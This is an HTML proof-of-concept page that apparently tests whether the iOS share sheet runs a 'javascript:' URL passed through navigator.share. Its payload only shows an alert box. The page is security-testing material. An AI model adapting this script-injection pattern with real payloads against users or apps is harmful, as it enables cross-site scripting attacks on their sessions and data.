<!DOCTYPE html>
<html>
<head>
  <title>iOS Share Sheet XSS PoC</title>
</head>
<body>
  <h2>iOS Share Sheet XSS PoC</h2>
  <p>Click the button to trigger the Share Sheet with a potentially unsafe URL.</p>

  <button id="shareBtn">Share Malicious URL</button>

  <script>
    const shareBtn = document.getElementById('shareBtn');

    shareBtn.addEventListener('click', async () => {
      const maliciousURL = "javascript:alert('XSS via Share Sheet!')";

      if (navigator.share) {
        try {
          await navigator.share({
            title: 'Test XSS',
            url: maliciousURL
          });
          console.log('Share successful');
        } catch (err) {
          console.error('Share failed:', err);
        }
      } else {
        alert('Share API not supported on this device');
      }
    });
  </script>
</body>
</html>
